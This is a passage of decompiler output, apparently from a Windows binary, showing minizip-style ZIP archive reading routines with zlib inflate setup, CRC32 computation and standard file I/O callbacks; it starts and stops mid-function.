  v5 = __CFADD__((*(_DWORD *)(a1 + 80))++, 1);
  *(_DWORD *)(a1 + 84) += v5;
  result = sub_4017E0(a1, (int *)(a1 + 128), (_DWORD *)(a1 + 216), 0, 0, 0, 0, 0, 0);
  *(_QWORD *)(a1 + 96) = result == 0;
  return result;
}

//----- (00401DE0) --------------------------------------------------------
int __cdecl sub_401DE0(int a1, const char *a2, int a3)
{
  int result; // eax
  int v4; // edx
  int v5; // eax
  int v6; // edx
  int v7; // eax
  int v8; // edx
  int v9; // edx
  int v10; // ecx
  int v11; // edx
  char v12[260]; // [esp+4h] [ebp-174h] BYREF
  char v13[88]; // [esp+108h] [ebp-70h] BYREF
  int v14; // [esp+160h] [ebp-18h]
  int v15; // [esp+164h] [ebp-14h]
  int v16; // [esp+168h] [ebp-10h]
  int v17; // [esp+16Ch] [ebp-Ch]
  int v18; // [esp+170h] [ebp-8h]
  int v19; // [esp+174h] [ebp-4h]

  if ( !a1 || strlen(a2) >= 0x100 )
    return -102;
  if ( !*(_QWORD *)(a1 + 96) )
    return -100;
  v4 = *(_DWORD *)(a1 + 84);
  v5 = *(_DWORD *)(a1 + 88);
  v16 = *(_DWORD *)(a1 + 80);
  v15 = *(_DWORD *)(a1 + 92);
  v17 = v4;
  v6 = *(_DWORD *)(a1 + 216);
  v14 = v5;
  v7 = *(_DWORD *)(a1 + 220);
  qmemcpy(v13, (const void *)(a1 + 128), sizeof(v13));
  v18 = v6;
  v19 = v7;
  for ( result = sub_401CC0(a1); !result; result = sub_401D30(a1) )
  {
    result = sub_401C90(a1, 0, (int)v12, 0x100u, 0, 0, 0, 0);
    if ( result )
      break;
    if ( !sub_4012C0(v12, a2, a3) )
      return 0;
  }
  v8 = v17;
  *(_DWORD *)(a1 + 80) = v16;
  *(_DWORD *)(a1 + 88) = v14;
  *(_DWORD *)(a1 + 84) = v8;
  v9 = v15;
  qmemcpy((void *)(a1 + 128), v13, 0x58u);
  v10 = v18;
  *(_DWORD *)(a1 + 92) = v9;
  v11 = v19;
  *(_DWORD *)(a1 + 216) = v10;
  *(_DWORD *)(a1 + 220) = v11;
  return result;
}

//----- (00401F10) --------------------------------------------------------
int __usercall sub_401F10@<eax>(int a1@<esi>, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  int v4; // edi
  __int64 v5; // kr00_8
  int v7; // eax
  int v8; // eax
  char v9; // bl
  int v10; // eax
  int v11; // ebx
  int v12; // eax
  int v13; // [esp+4h] [ebp-8h] BYREF
  int v14; // [esp+8h] [ebp-4h] BYREF

  v4 = 0;
  *a2 = 0;
  *a3 = 0;
  a3[1] = 0;
  *a4 = 0;
  v5 = *(_QWORD *)(a1 + 216) + *(_QWORD *)(a1 + 72);
  if ( sub_402BD0(a1, *(_DWORD *)(a1 + 48), v5, SHIDWORD(v5), 0) )
    return -1;
  if ( sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v14) )
  {
    v4 = -1;
  }
  else if ( v14 != 67324752 )
  {
    v4 = -103;
  }
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v14) )
    v4 = -1;
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v13) )
    v4 = -1;
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v14) )
  {
    v4 = -1;
  }
  else if ( !v4 )
  {
    v7 = *(_DWORD *)(a1 + 140);
    if ( v14 != v7 || v7 && v7 != 12 && v7 != 8 )
      v4 = -103;
  }
  if ( sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v14) )
    v4 = -1;
  v8 = sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v14);
  v9 = v13;
  if ( v8 )
  {
    v4 = -1;
  }
  else if ( !v4 && v14 != *(_DWORD *)(a1 + 148) && (v13 & 8) == 0 )
  {
    v4 = -103;
  }
  if ( sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v14) )
  {
    v4 = -1;
  }
  else if ( v14 != -1 && !v4 && (v14 != *(_DWORD *)(a1 + 152) || *(_DWORD *)(a1 + 156)) && (v9 & 8) == 0 )
  {
    v4 = -103;
  }
  if ( sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v14) )
  {
    v4 = -1;
  }
  else if ( v14 != -1 && !v4 && (v14 != *(_DWORD *)(a1 + 160) || *(_DWORD *)(a1 + 164)) && (v9 & 8) == 0 )
  {
    v4 = -103;
  }
  v10 = sub_401040(*(_DWORD *)(a1 + 48), a1, &v13);
  v11 = v13;
  if ( v10 )
  {
    v4 = -1;
  }
  else if ( !v4 && v13 != *(_DWORD *)(a1 + 168) )
  {
    v4 = -103;
  }
  *a2 += v13;
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v13) )
    v4 = -1;
  *(_QWORD *)a3 = *(_QWORD *)(a1 + 216) + (unsigned int)v11 + 30i64;
  v12 = v13;
  *a4 = v13;
  *a2 += v12;
  return v4;
}

//----- (00402140) --------------------------------------------------------
int __usercall sub_402140@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, int a4, unsigned int a5)
{
  int result; // eax
  int *v6; // esi
  int v7; // eax
  unsigned int v8; // ecx
  int v9; // edi
  __int64 v10; // kr08_8
  int v11; // edx
  bool v12; // cf
  int v13; // eax
  unsigned int v14; // ebx
  int v15; // ecx
  int v16; // eax
  unsigned int v17; // eax
  unsigned int v18; // edi
  unsigned int i; // eax
  _BYTE *v20; // eax
  int v21; // ecx
  int v22; // eax
  unsigned int v23; // [esp+8h] [ebp-10h]
  _BYTE *v24; // [esp+10h] [ebp-8h]
  int v25; // [esp+14h] [ebp-4h]
  int v26; // [esp+20h] [ebp+8h]

  v25 = 0;
  if ( !a3 )
    return -102;
  v6 = *(int **)(a3 + 224);
  if ( !v6 )
    return -102;
  if ( !*v6 )
    return -100;
  if ( !a5 )
    return 0;
  v6[4] = a4;
  v6[5] = a5;
  if ( (unsigned __int64)a5 > *((_QWORD *)v6 + 16) && !v6[50] )
    v6[5] = v6[32];
  if ( a5 > *((_QWORD *)v6 + 15) + (unsigned __int64)(unsigned int)v6[2] && v6[50] )
    v6[5] = v6[2] + v6[30];
  while ( v6[5] )
  {
    if ( !v6[2] )
    {
      v7 = v6[31];
      v8 = v6[30];
      if ( v7 || v8 )
      {
        v9 = 0x4000;
        if ( !v7 && v8 < 0x4000 )
        {
          v9 = v6[30];
          if ( !v9 )
            return 0;
        }
        v10 = *((_QWORD *)v6 + 8) + *((_QWORD *)v6 + 24);
        if ( sub_402BD0((int)(v6 + 34), v6[45], v10, SHIDWORD(v10), 0)
          || ((int (__cdecl *)(int, int, _DWORD, int))v6[35])(v6[41], v6[45], *v6, v9) != v9 )
        {
          return -1;
        }
        v11 = *v6;
        v12 = __CFADD__(v9, v6[16]);
        v6[16] += v9;
        v6[1] = v11;
        v6[2] = v9;
        v6[17] += v12;
        *((_QWORD *)v6 + 15) -= (unsigned int)v9;
      }
    }
    v13 = v6[46];
    if ( !v13 || v6[50] )
    {
      v17 = v6[2];
      if ( !v17 && !*((_QWORD *)v6 + 15) )
        return v25;
      v18 = v6[5];
      if ( v18 >= v17 )
        v18 = v6[2];
      for ( i = 0; i < v18; ++i )
        *(_BYTE *)(i + v6[4]) = *(_BYTE *)(i + v6[1]);
      v20 = (_BYTE *)v6[4];
      v21 = v6[28];
      v12 = __CFADD__(v18, v6[26]);
      v6[26] += v18;
      v6[27] += v12;
      v22 = sub_4030C0(v21, v20, v18);
      v12 = v6[32] < v18;
      v6[32] -= v18;
      v6[28] = v22;
      v6[33] -= v12;
      v6[2] -= v18;
      v6[5] -= v18;
      v6[4] += v18;
      v6[1] += v18;
      v6[6] += v18;
      v25 += v18;
    }
    else if ( v13 != 12 )
    {
      v23 = v6[6];
      v24 = (_BYTE *)v6[4];
      v26 = sub_403400(a1, a2, v6 + 1, 2);
      if ( v26 >= 0 )
      {
        if ( v6[7] )
          v26 = -3;
      }
      v14 = v6[6];
      v12 = __CFADD__(v14 - v23, v6[26]);
      v6[26] += v14 - v23;
      v15 = v6[28];
      v6[27] += ((v14 - (unsigned __int64)v23) >> 32) + v12;
      v16 = sub_4030C0(v15, v24, v14 - v23);
      v12 = v6[32] < v14 - v23;
      v6[32] -= v14 - v23;
      v6[28] = v16;
      result = v26;
      v6[33] -= v12 + ((v14 - (unsigned __int64)v23) >> 32);
      v25 += v14 - v23;
      if ( v26 == 1 )
        return v25;
      if ( v26 )
        return result;
    }
  }
  return v25;
}
// 4021CA: conditional instruction was optimized away because edx.4==0

//----- (004023D0) --------------------------------------------------------
int __cdecl sub_4023D0(int a1)
{
  int result; // eax
  int v2; // esi
  bool v3; // zf
  int v4; // [esp+4h] [ebp-4h]

  v4 = 0;
  if ( !a1 )
    return -102;
  v2 = *(_DWORD *)(a1 + 224);
  if ( !v2 )
    return -102;
  if ( !*(_QWORD *)(v2 + 128)
    && *(_DWORD *)(v2 + 200) == (*(_DWORD *)(v2 + 132) | *(_DWORD *)(v2 + 128))
    && *(_DWORD *)(v2 + 112) != *(_DWORD *)(v2 + 116) )
  {
    v4 = -105;
  }
  if ( *(_DWORD *)v2 )
    j___free_base(*(void **)v2);
  v3 = *(_DWORD *)(v2 + 72) == 8;
  *(_DWORD *)v2 = 0;
  if ( v3 )
    sub_404930((_DWORD *)(v2 + 4));
  *(_DWORD *)(v2 + 72) = 0;
  j___free_base((void *)v2);
  result = v4;
  *(_DWORD *)(a1 + 224) = 0;
  return result;
}

//----- (00402470) --------------------------------------------------------
void *__usercall sub_402470@<eax>(const void *a1@<eax>, int a2, int a3)
{
  int v3; // ebx
  int v4; // eax
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // rax
  void *v8; // eax
  void *v9; // ebx
  _QWORD v10[30]; // [esp+Ch] [ebp-10Ch] BYREF
  unsigned __int64 v11; // [esp+FCh] [ebp-1Ch]
  int v12; // [esp+104h] [ebp-14h] BYREF
  int v13; // [esp+108h] [ebp-10h] BYREF
  int v14; // [esp+10Ch] [ebp-Ch] BYREF
  __int64 v15; // [esp+110h] [ebp-8h] BYREF

  v3 = 0;
  LODWORD(v10[5]) = 0;
  HIDWORD(v10[4]) = 0;
  if ( a1 )
    qmemcpy(v10, a1, 0x2Cu);
  else
    sub_402DB0((FILE *(__cdecl **)(int, char *, char))v10);
  HIDWORD(v10[5]) = a3;
  v4 = sub_402B90((int)v10, a2, 5);
  LODWORD(v10[6]) = v4;
  if ( !v4 )
    return 0;
  LODWORD(v5) = sub_4014B0((int)v10, v4);
  v11 = v5;
  if ( v5 )
  {
    LODWORD(v10[29]) = 1;
    if ( sub_402BD0((int)v10, v10[6], v5, SHIDWORD(v5), 0) )
      v3 = -1;
    if ( sub_4010A0(v10[6], (int)v10, (_DWORD *)&v15 + 1) )
      v3 = -1;
    if ( sub_401130(v10[6], (int)v10, &v12) )
      v3 = -1;
    if ( sub_401040(v10[6], (int)v10, &v13) )
      v3 = -1;
    if ( sub_401040(v10[6], (int)v10, &v13) )
      v3 = -1;
    if ( sub_4010A0(v10[6], (int)v10, &v13) )
      v3 = -1;
    if ( sub_4010A0(v10[6], (int)v10, &v14) )
      v3 = -1;
    if ( sub_401130(v10[6], (int)v10, (int *)&v10[7]) )
      v3 = -1;
    if ( sub_401130(v10[6], (int)v10, (int *)&v15) )
      v3 = -1;
    if ( v15 != v10[7] || v14 || v13 )
      v3 = -103;
    if ( sub_401130(v10[6], (int)v10, (int *)&v10[14]) )
      v3 = -1;
    if ( sub_401130(v10[6], (int)v10, (int *)&v10[15]) )
      v3 = -1;
    LODWORD(v10[8]) = 0;
  }
  else
  {
    v6 = sub_401310((int)v10, v10[6]);
    v11 = v6;
    if ( !v6 )
      v3 = -1;
    LODWORD(v10[29]) = 0;
    if ( sub_402BD0((int)v10, v10[6], v6, SHIDWORD(v6), 0) )
      v3 = -1;
    if ( sub_4010A0(v10[6], (int)v10, (_DWORD *)&v15 + 1) )
      v3 = -1;
    if ( sub_401040(v10[6], (int)v10, &v13) )
      v3 = -1;
    if ( sub_401040(v10[6], (int)v10, &v14) )
      v3 = -1;
    if ( sub_401040(v10[6], (int)v10, (int *)&v15 + 1) )
      v3 = -1;
    v10[7] = HIDWORD(v15);
    if ( sub_401040(v10[6], (int)v10, (int *)&v15 + 1) )
      v3 = -1;
    if ( v10[7] != HIDWORD(v15) || v14 || v13 )
      v3 = -103;
    if ( sub_4010A0(v10[6], (int)v10, (_DWORD *)&v15 + 1) )
      v3 = -1;
    v10[14] = HIDWORD(v15);
    if ( sub_4010A0(v10[6], (int)v10, (_DWORD *)&v15 + 1) )
      v3 = -1;
    v10[15] = HIDWORD(v15);
    if ( sub_401040(v10[6], (int)v10, (int *)&v10[8]) )
      v3 = -1;
  }
  if ( v11 < v10[14] + v10[15] || v3 )
  {
    ((void (__cdecl *)(_DWORD, _DWORD))HIDWORD(v10[2]))(HIDWORD(v10[3]), v10[6]);
    return 0;
  }
  v10[9] = v11 - v10[15] - v10[14];
  v10[13] = v11;
  v10[28] = 0i64;
  v8 = malloc(0xF0u);
  v9 = v8;
  if ( v8 )
  {
    qmemcpy(v8, v10, 0xF0u);
    sub_401CC0((int)v8);
  }
  return v9;
}
// 4024F2: variable 'v5' is possibly undefined

//----- (004028E0) --------------------------------------------------------
void *__cdecl sub_4028E0(int a1)
{
  return sub_402470(0, a1, 1);
}

//----- (00402900) --------------------------------------------------------
int __cdecl sub_402900(_DWORD *Block)
{
  if ( !Block )
    return -102;
  if ( Block[56] )
    sub_4023D0((int)Block);
  ((void (__cdecl *)(_DWORD, _DWORD))Block[5])(Block[7], Block[12]);
  j___free_base(Block);
  return 0;
}

//----- (00402940) --------------------------------------------------------
int __cdecl sub_402940(int a1, _DWORD *a2, _DWORD *a3, int a4, int a5)
{
  _DWORD *v6; // ebx
  void *v7; // eax
  int v8; // edx
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  int v12; // edx
  __int64 v13; // kr00_8
  int v14; // edi
  int v15[2]; // [esp+4h] [ebp-Ch] BYREF
  int v16; // [esp+Ch] [ebp-4h] BYREF

  if ( a5 )
    return -102;
  if ( !a1 || !*(_QWORD *)(a1 + 96) )
    return -102;
  if ( *(_DWORD *)(a1 + 224) )
    sub_4023D0(a1);
  if ( sub_401F10(a1, &v16, v15, &a5) )
    return -103;
  v6 = malloc(0xD0u);
  if ( !v6 )
    return -104;
  v7 = malloc(0x4000u);
  v8 = v15[1];
  v6[20] = v15[0];
  v9 = a5;
  v6[21] = v8;
  *v6 = v7;
  v6[22] = v9;
  v6[24] = 0;
  v6[25] = 0;
  v6[50] = a4;
  if ( !v7 )
  {
    j___free_base(v6);
    return -104;
  }
  v6[18] = 0;
  if ( a2 )
    *a2 = *(_DWORD *)(a1 + 140);
  if ( a3 )
  {
    *a3 = 6;
    switch ( *(_DWORD *)(a1 + 136) & 6 )
    {
      case 2:
        *a3 = 9;
        break;
      case 4:
        *a3 = 2;
        break;
      case 6:
        *a3 = 1;
        break;
    }
  }
  v6[29] = *(_DWORD *)(a1 + 148);
  v6[28] = 0;
  v6[26] = 0;
  v6[27] = 0;
  v6[46] = *(_DWORD *)(a1 + 140);
  v6[45] = *(_DWORD *)(a1 + 48);
  v10 = a1;
  qmemcpy(v6 + 34, (const void *)a1, 0x2Cu);
  v6[48] = *(_DWORD *)(a1 + 72);
  v6[49] = *(_DWORD *)(a1 + 76);
  v6[6] = 0;
  v11 = *(_DWORD *)(a1 + 140);
  if ( v11 == 12 && !a4 )
  {
    v6[50] = 1;
LABEL_26:
    v6[30] = *(_DWORD *)(v10 + 152);
    v6[31] = *(_DWORD *)(v10 + 156);
    v6[32] = *(_DWORD *)(v10 + 160);
    v12 = v16;
    v6[33] = *(_DWORD *)(v10 + 164);
    v13 = *(_QWORD *)(v10 + 216) + (unsigned int)v12 + 30i64;
    v6[2] = 0;
    *((_QWORD *)v6 + 8) = v13;
    *(_DWORD *)(v10 + 224) = v6;
    *(_DWORD *)(v10 + 228) = 0;
    return 0;
  }
  if ( v11 != 8 || a4 )
    goto LABEL_26;
  v6[9] = 0;
  v6[10] = 0;
  v6[11] = 0;
  v6[1] = 0;
  v6[2] = 0;
  v14 = sub_403220(v6 + 1, -15, "1.2.7", 56);
  if ( !v14 )
  {
    v10 = a1;
    v6[18] = 8;
    goto LABEL_26;
  }
  j___free_base(v6);
  return v14;
}

//----- (00402B70) --------------------------------------------------------
int __cdecl sub_402B70(int a1)
{
  return sub_402940(a1, 0, 0, 0, 0);
}

//----- (00402B90) --------------------------------------------------------
int __cdecl sub_402B90(int a1, int a2, int a3)
{
  if ( *(_DWORD *)a1 )
    return (*(int (__cdecl **)(_DWORD, int, int))a1)(*(_DWORD *)(a1 + 28), a2, a3);
  else
    return (*(int (__cdecl **)(_DWORD, int, int))(a1 + 32))(*(_DWORD *)(a1 + 28), a2, a3);
}

//----- (00402BD0) --------------------------------------------------------
int __cdecl sub_402BD0(int a1, int a2, int a3, int a4, int a5)
{
  int (__cdecl *v5)(_DWORD, int, int, int, int); // eax

  v5 = *(int (__cdecl **)(_DWORD, int, int, int, int))(a1 + 16);
  if ( v5 )
    return v5(*(_DWORD *)(a1 + 28), a2, a3, a4, a5);
  if ( a4 )
    return -1;
  return (*(int (__cdecl **)(_DWORD, int, int, int))(a1 + 40))(*(_DWORD *)(a1 + 28), a2, a3, a5);
}

//----- (00402C30) --------------------------------------------------------
int __cdecl sub_402C30(int a1, int a2)
{
  int v3; // [esp-8h] [ebp-8h]

  v3 = *(_DWORD *)(a1 + 28);
  if ( *(_DWORD *)(a1 + 16) )
    return (*(int (__cdecl **)(int, int))(a1 + 12))(v3, a2);
  else
    return (*(int (__cdecl **)(int, int))(a1 + 36))(v3, a2);
}

//----- (00402C70) --------------------------------------------------------
FILE *__cdecl sub_402C70(int a1, char *FileName, char a3)
{
  const char *v3; // ecx

  v3 = 0;
  if ( (a3 & 3) == 1 )
  {
    v3 = "rb";
  }
  else if ( (a3 & 4) != 0 )
  {
    v3 = "r+b";
  }
  else if ( (a3 & 8) != 0 )
  {
    v3 = "wb";
  }
  if ( FileName && v3 )
    return fopen(FileName, v3);
  else
    return 0;
}

//----- (00402CC0) --------------------------------------------------------
size_t __cdecl sub_402CC0(int a1, FILE *Stream, void *Buffer, size_t ElementCount)
{
  return fread(Buffer, 1u, ElementCount, Stream);
}

//----- (00402CE0) --------------------------------------------------------
size_t __cdecl sub_402CE0(int a1, FILE *Stream, void *Buffer, size_t ElementCount)
{
  return fwrite(Buffer, 1u, ElementCount, Stream);
}

//----- (00402D00) --------------------------------------------------------
__int64 __cdecl sub_402D00(int a1, FILE *Stream)
{
  return _ftelli64(Stream);
}

//----- (00402D20) --------------------------------------------------------
int __cdecl sub_402D20(int a1, FILE *Stream, __int64 Offset, int a4)
{
  int v5; // eax
  int v6; // esi

  if ( a4 )
  {
    if ( a4 == 1 )
    {
      v5 = 1;
    }
    else
    {
      if ( a4 != 2 )
        return -1;
      v5 = 2;
    }
  }
  else
  {
    v5 = 0;
  }
  v6 = 0;
  if ( _fseeki64(Stream, Offset, v5) )
    return -1;
  return v6;
}

//----- (00402D70) --------------------------------------------------------
int __cdecl sub_402D70(int a1, FILE *Stream)
{
  return fclose(Stream);
}

//----- (00402D90) --------------------------------------------------------
int __cdecl sub_402D90(int a1, FILE *Stream)
{
  return ferror(Stream);
}

//----- (00402DB0) --------------------------------------------------------
FILE *(__cdecl **__cdecl sub_402DB0(
        FILE *(__cdecl **a1)(int a1, char *FileName, char a3)))(int a1, char *FileName, char a3)
{
  FILE *(__cdecl **result)(int, char *, char); // eax

  result = a1;
  *a1 = sub_402C70;
  a1[1] = (FILE *(__cdecl *)(int, char *, char))sub_402CC0;
  a1[2] = (FILE *(__cdecl *)(int, char *, char))sub_402CE0;
  a1[3] = (FILE *(__cdecl *)(int, char *, char))sub_402D00;
  a1[4] = (FILE *(__cdecl *)(int, char *, char))sub_402D20;
  a1[5] = (FILE *(__cdecl *)(int, char *, char))sub_402D70;
  a1[6] = (FILE *(__cdecl *)(int, char *, char))sub_402D90;
  a1[7] = 0;
  return result;
}

//----- (004030C0) --------------------------------------------------------
int __cdecl sub_4030C0(int a1, _BYTE *a2, unsigned int a3)
{
  unsigned int v3; // esi
  unsigned int i; // eax
  unsigned int v5; // edi
  unsigned int v6; // edx
  unsigned int v7; // eax
  unsigned int v8; // edx
  unsigned int v9; // eax
  unsigned int v10; // edx
  unsigned int v11; // eax
  unsigned int v12; // edx
  unsigned int v13; // edx
  unsigned int v14; // eax
  _BYTE *v15; // ecx

  v15 = a2;
  if ( !a2 )
    return 0;
  v3 = a3;
  for ( i = ~a1; v3; --v3 )
  {
    if ( ((unsigned __int8)v15 & 3) == 0 )
      break;
    i = dword_42FE08[(unsigned __int8)(i ^ *v15++)] ^ (i >> 8);
  }
  if ( v3 >= 0x20 )
  {
    v5 = v3 >> 5;
    do
    {
      v6 = *((_DWORD *)v15 + 1) ^ dword_430A08[(unsigned __int8)(*v15 ^ i)] ^ dword_42FE08[(*(_DWORD *)v15 ^ i) >> 24] ^ dword_430608[(unsigned __int8)((unsigned __int16)(*(_WORD *)v15 ^ i) >> 8)] ^ dword_430208[(unsigned __int8)((*(_DWORD *)v15 ^ i) >> 16)];
      v7 = *((_DWORD *)v15 + 2) ^ dword_430A08[(unsigned __int8)v6] ^ dword_42FE08[HIBYTE(v6)] ^ dword_430608[BYTE1(v6)] ^ dword_430208[BYTE2(v6)];
      v8 = *((_DWORD *)v15 + 3) ^ dword_430A08[(unsigned __int8)v7] ^ dword_42FE08[HIBYTE(v7)] ^ dword_430608[BYTE1(v7)] ^ dword_430208[BYTE2(v7)];
      v9 = *((_DWORD *)v15 + 4) ^ dword_430A08[(unsigned __int8)v8] ^ dword_42FE08[HIBYTE(v8)] ^ dword_430608[BYTE1(v8)] ^ dword_430208[BYTE2(v8)];
      v10 = *((_DWORD *)v15 + 5) ^ dword_430A08[(unsigned __int8)v9] ^ dword_42FE08[HIBYTE(v9)] ^ dword_430608[BYTE1(v9)] ^ dword_430208[BYTE2(v9)];
      v15 += 32;
      v11 = *((_DWORD *)v15 - 2) ^ dword_430A08[(unsigned __int8)v10] ^ dword_42FE08[HIBYTE(v10)] ^ dword_430608[BYTE1(v10)] ^ dword_430208[BYTE2(v10)];
      v3 -= 32;
      v12 = *((_DWORD *)v15 - 1) ^ dword_430A08[(unsigned __int8)v11] ^ dword_42FE08[HIBYTE(v11)] ^ dword_430608[BYTE1(v11)] ^ dword_430208[BYTE2(v11)];
      i = dword_430A08[(unsigned __int8)v12] ^ dword_42FE08[HIBYTE(v12)] ^ dword_430608[BYTE1(v12)] ^ dword_430208[BYTE2(v12)];
      --v5;
    }
    while ( v5 );
  }
  if ( v3 >= 4 )
  {
    v13 = v3 >> 2;
    do
    {
      v14 = *(_DWORD *)v15 ^ i;
      v15 += 4;
      v3 -= 4;
      --v13;
      i = dword_430A08[(unsigned __int8)v14] ^ dword_42FE08[HIBYTE(v14)] ^ dword_430608[BYTE1(v14)] ^ dword_430208[BYTE2(v14)];
    }
    while ( v13 );
  }
  for ( ; v3; --v3 )
    i = dword_42FE08[(unsigned __int8)(i ^ *v15++)] ^ (i >> 8);
  return ~i;
}
// 42FE08: using guessed type int dword_42FE08[128];
// 430208: using guessed type int dword_430208[256];
// 430608: using guessed type int dword_430608[256];
// 430A08: using guessed type int dword_430A08[256];

//----- (004030E0) --------------------------------------------------------
int __cdecl sub_4030E0(_DWORD *a1)
{
  _DWORD *v1; // eax

  if ( !a1 )
    return -2;
  v1 = (_DWORD *)a1[7];
  if ( !v1 )
    return -2;
  v1[7] = 0;
  a1[5] = 0;
  a1[2] = 0;
  a1[6] = 0;
  if ( v1[2] )
    a1[12] = v1[2] & 1;
  *v1 = 0;
  v1[1] = 0;
  v1[3] = 0;
  v1[8] = 0;
  v1[14] = 0;
  v1[15] = 0;
  v1[5] = 0x8000;
  v1[27] = v1 + 332;
  v1[20] = v1 + 332;
  v1[19] = v1 + 332;
  v1[1776] = 1;
  v1[1777] = -1;
  return 0;
}

//----- (00403160) --------------------------------------------------------
int __cdecl sub_403160(_DWORD *a1)
{
  _DWORD *v1; // eax

  if ( !a1 )
    return -2;
  v1 = (_DWORD *)a1[7];
  if ( !v1 )
    return -2;
  v1[10] = 0;
  v1[11] = 0;
  v1[12] = 0;
  return sub_4030E0(a1);
}

//----- (00403190) --------------------------------------------------------
int __cdecl sub_403190(int a1, int a2)
{
  _DWORD *v2; // ecx
  _DWORD *v3; // edi
  int v4; // esi
  int v5; // ebx

  v2 = (_DWORD *)a1;
  if ( !a1 )
    return -2;
  v3 = *(_DWORD **)(a1 + 28);
  if ( !v3 )
    return -2;
  v4 = a2;
  if ( a2 >= 0 )
  {
    v5 = (a2 >> 4) + 1;
    if ( a2 < 48 )
      v4 = a2 & 0xF;
  }
  else
  {
    v5 = 0;
    v4 = -a2;
  }
  if ( v4 && (v4 < 8 || v4 > 15) )
    return -2;
  if ( v3[13] )
  {
    if ( v3[9] != v4 )
    {
      (*(void (__cdecl **)(_DWORD, _DWORD))(a1 + 36))(*(_DWORD *)(a1 + 40), v3[13]);
      v2 = (_DWORD *)a1;
      v3[13] = 0;
    }
  }
  v3[2] = v5;
  v3[9] = v4;
  return sub_403160(v2);
}

//----- (00403220) --------------------------------------------------------
int __cdecl sub_403220(_DWORD *a1, int a2, _BYTE *a3, int a4)
{
  int v5; // eax
  int v6; // edi
  int v7; // ebx

  if ( !a3 || *a3 != 49 || a4 != 56 )
    return -6;
  if ( !a1 )
    return -2;
  a1[6] = 0;
  if ( !a1[8] )
  {
    a1[8] = sub_404980;
    a1[10] = 0;
  }
  if ( !a1[9] )
    a1[9] = sub_4049A0;
  v5 = ((int (__cdecl *)(_DWORD, int, int))a1[8])(a1[10], 1, 7116);
  v6 = v5;
  if ( !v5 )
    return -4;
  a1[7] = v5;
  *(_DWORD *)(v5 + 52) = 0;
  v7 = sub_403190((int)a1, a2);
  if ( v7 )
  {
    ((void (__cdecl *)(_DWORD, int))a1[9])(a1[10], v6);
    a1[7] = 0;
  }
  return v7;
}

//----- (004032E0) --------------------------------------------------------
_DWORD *__usercall sub_4032E0@<eax>(_DWORD *result@<eax>)
{
  result[19] = &unk_431E08;
  result[21] = 9;
  result[20] = &unk_432608;
  result[22] = 5;
  return result;
}

//----- (00403300) --------------------------------------------------------
int __usercall sub_403300@<eax>(int a1@<eax>, int a2@<ebx>)
{
  int v2; // esi
  int v4; // eax
  int v6; // ecx
  size_t v7; // edi
  size_t v8; // eax
  size_t v9; // eax
  size_t v10; // edi
  int v11; // edx
  unsigned int v12; // eax
  unsigned int v13; // edx
  size_t v14; // [esp+8h] [ebp-4h]

  v2 = *(_DWORD *)(a2 + 28);
  if ( !*(_DWORD *)(v2 + 52) )
  {
    v4 = (*(int (__cdecl **)(_DWORD, int, int))(a2 + 32))(*(_DWORD *)(a2 + 40), 1 << *(_DWORD *)(v2 + 36), 1);
    *(_DWORD *)(v2 + 52) = v4;
    if ( !v4 )
      return 1;
  }
  if ( !*(_DWORD *)(v2 + 40) )
  {
    v6 = *(_DWORD *)(v2 + 36);
    *(_DWORD *)(v2 + 48) = 0;
    *(_DWORD *)(v2 + 44) = 0;
    *(_DWORD *)(v2 + 40) = 1 << v6;
  }
  v7 = a1 - *(_DWORD *)(a2 + 16);
  v8 = *(_DWORD *)(v2 + 40);
  if ( v7 < v8 )
  {
    v9 = v8 - *(_DWORD *)(v2 + 48);
    v14 = v9;
    if ( v9 > v7 )
    {
      v14 = v7;
      v9 = v7;
    }
    memmove_0((void *)(*(_DWORD *)(v2 + 48) + *(_DWORD *)(v2 + 52)), (const void *)(*(_DWORD *)(a2 + 12) - v7), v9);
    v10 = v7 - v14;
    if ( v10 )
    {
      memmove_0(*(void **)(v2 + 52), (const void *)(*(_DWORD *)(a2 + 12) - v10), v10);
      v11 = *(_DWORD *)(v2 + 40);
      *(_DWORD *)(v2 + 48) = v10;
      *(_DWORD *)(v2 + 44) = v11;
      return 0;
    }
    else
    {
      v12 = *(_DWORD *)(v2 + 40);
      *(_DWORD *)(v2 + 48) += v14;
      if ( *(_DWORD *)(v2 + 48) == v12 )
        *(_DWORD *)(v2 + 48) = 0;
      v13 = *(_DWORD *)(v2 + 44);
      if ( v13 < v12 )
        *(_DWORD *)(v2 + 44) = v14 + v13;
      return 0;
    }
  }
  else
  {
    memmove_0(*(void **)(v2 + 52), (const void *)(*(_DWORD *)(a2 + 12) - v8), *(_DWORD *)(v2 + 40));
    *(_DWORD *)(v2 + 44) = *(_DWORD *)(v2 + 40);
    *(_DWORD *)(v2 + 48) = 0;
    return 0;
  }
}

//----- (00403400) --------------------------------------------------------
int __usercall sub_403400@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int *a3, int a4)
{
  int v4; // edi
  unsigned __int8 *v5; // edx
  size_t v6; // ecx
  unsigned int v7; // ebx
  int v8; // eax
  unsigned int v9; // esi
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  unsigned int v14; // eax
  unsigned int v15; // ecx
  unsigned int v16; // eax
  int v17; // eax
  int v18; // eax
  int *v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v27; // eax
  int v28; // eax
  int v29; // eax
  int v30; // eax
  int v31; // eax
  int v32; // eax
  int v33; // eax
  unsigned int v34; // eax
  int v35; // ecx
  int v36; // edx
  int v37; // ecx
  unsigned int v38; // edx
  int v39; // eax
  size_t v40; // eax
  int v41; // ecx
  int v42; // eax
  unsigned int v43; // ecx
  int v44; // eax
  int v45; // eax
  size_t v46; // eax
  int v47; // ecx
  int v48; // eax
  unsigned int v49; // ecx
  int v50; // eax
  int v51; // eax
  int v52; // eax
